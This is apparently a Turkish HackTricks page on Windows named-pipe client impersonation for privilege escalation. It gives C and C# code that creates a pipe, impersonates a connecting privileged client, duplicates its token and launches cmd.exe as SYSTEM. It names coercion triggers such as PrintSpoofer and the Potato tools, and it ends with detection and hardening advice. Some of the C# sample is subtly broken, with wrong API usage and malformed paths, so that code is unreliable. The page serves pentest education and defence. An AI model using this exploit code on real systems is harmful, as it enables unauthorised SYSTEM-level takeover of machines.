# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation, bir named-pipe sunucu iş parçacığının ona bağlanan bir client'ın güvenlik bağlamını üstlenmesini sağlayan bir local privilege escalation primitifidir. Pratikte, SeImpersonatePrivilege ile kod çalıştırabilen bir saldırgan, ayrıcalıklı bir client'ı (ör. bir SYSTEM servisi) saldırgan-kontrolündeki bir pipe'a bağlanmaya zorlayabilir, ImpersonateNamedPipeClient çağrısı yapabilir, ortaya çıkan token'ı primary token olarak DuplicateTokenEx ile çoğaltabilir ve client olarak bir süreç başlatabilir (çoğunlukla NT AUTHORITY\SYSTEM).

Bu sayfa temel tekniğe odaklanır. SYSTEM'i pipe'ınıza bağlamaya zorlayan uçtan uca exploit zincirleri için aşağıda referans verilen Potato family sayfalarına bakın.

## TL;DR
- Bir named pipe oluşturun: \\.\pipe\<random> ve bir bağlantı bekleyin.
- Ayrıcalıklı bir bileşenin ona bağlanmasını sağlayın (spooler/DCOM/EFSRPC/vesaire).
- Pipe'tan en az bir mesaj okuyun, sonra ImpersonateNamedPipeClient çağrısı yapın.
- Mevcut iş parçacığından impersonation token'ını açın, DuplicateTokenEx(TokenPrimary) yapın ve CreateProcessWithTokenW/CreateProcessAsUser ile SYSTEM süreci elde edin.

## Requirements and key APIs
- Çağıran process/thread tarafından tipik olarak gereken ayrıcalıklar:
- SeImpersonatePrivilege, bağlanan bir client'ı başarılı şekilde impersonate etmek ve CreateProcessWithTokenW kullanmak için.
- Alternatif olarak, SYSTEM'i impersonate ettikten sonra CreateProcessAsUser kullanabilirsiniz; bu SeAssignPrimaryTokenPrivilege ve SeIncreaseQuotaPrivilege gerektirebilir (bunlar SYSTEM'i impersonate ederken sağlanır).
- Kullanılan temel API'ler:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (impersonasyondan önce en az bir mesaj okunmalıdır)
- ImpersonateNamedPipeClient ve RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW veya CreateProcessAsUser
- Impersonation seviyesi: yerel olarak faydalı işlemler yapabilmek için client, SecurityImpersonation'a izin vermelidir (birçok yerel RPC/named-pipe client için varsayılan). Client'lar pipe'ı açarken SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION ile bunu düşürebilirler.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notlar:
- Eğer ImpersonateNamedPipeClient ERROR_CANNOT_IMPERSONATE (1368) döndürürse, önce pipe'tan okuduğunuzdan ve istemcinin impersonation'ı Identification level ile sınırlamadığından emin olun.
- Process oluşturma için uygun bir primary token yaratmak amacıyla DuplicateTokenEx'i SecurityImpersonation ve TokenPrimary ile tercih edin.

## .NET hızlı örnek
.NET'te NamedPipeServerStream RunAsClient aracılığıyla impersonate edebilir. Impersonate edildikten sonra thread token'ı duplicate edip bir process oluşturun.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## SYSTEM'i pipe'ınıza bağlatmak için yaygın tetikleyiciler/zorlama yöntemleri
Bu teknikler, ayrıcalıklı hizmetleri sizin named pipe'ınıza bağlanmaya zorlayarak onları taklit etmenizi sağlar:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Ayrıntılı kullanım ve uyumluluk için bakınız:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Eğer sadece pipe'ı oluşturma ve bir hizmet tetikleyicisinden SYSTEM oluşturmak için taklit etme konusunda tam bir örneğe ihtiyacınız varsa, bakınız:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## Sorun giderme ve tuzaklar
- ImpersonateNamedPipeClient çağırmadan önce pipe'tan en az bir mesaj okumalısınız; aksi takdirde ERROR_CANNOT_IMPERSONATE (1368) alırsınız.
- Eğer client SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION ile bağlanırsa, server tam olarak taklit edemez; token'ın impersonation seviyesini GetTokenInformation(TokenImpersonationLevel) ile kontrol edin.
- CreateProcessWithTokenW çağıran üzerinde SeImpersonatePrivilege gerektirir. Bu ERROR_PRIVILEGE_NOT_HELD (1314) ile başarısız olursa, zaten SYSTEM'i taklit ettikten sonra CreateProcessAsUser kullanın.
- Pipe'ınızın security descriptor'ının hedef servisin bağlanmasına izin verdiğinden emin olun; sertleştirirseniz dikkat edin. Varsayılan olarak, \\.\pipe altındaki pipe'lar server'ın DACL'sine göre erişilebilirdir.

## Tespit ve sertleştirme
- Named pipe oluşturulmasını ve bağlantıları izleyin. Sysmon Event IDs 17 (Pipe Created) ve 18 (Pipe Connected), meşru pipe isimlerini temel almak ve token-manipülasyon olaylarından önce görülen sıra dışı, rastgele görünümlü pipe'ları yakalamak için kullanışlıdır.
- Aşağıdaki dizilimlere bakın: bir process pipe oluşturur, bir SYSTEM service bağlanır, sonra pipe'ı oluşturan process SYSTEM olarak bir child spawn eder.
- Gereksiz servis hesaplarından SeImpersonatePrivilege'i kaldırarak ve yüksek ayrıcalıklı gereksiz service logon'larından kaçınarak maruziyeti azaltın.
- Savunmacı geliştirme: güvenilmeyen named pipe'lara bağlanırken, sunucuların gerektiğinde haricinde client'ı tam taklit etmesini engellemek için SECURITY_SQOS_PRESENT ile SECURITY_IDENTIFICATION belirtin.

## References
- Windows: ImpersonateNamedPipeClient documentation (impersonation requirements and behavior). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (walkthrough and code examples). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
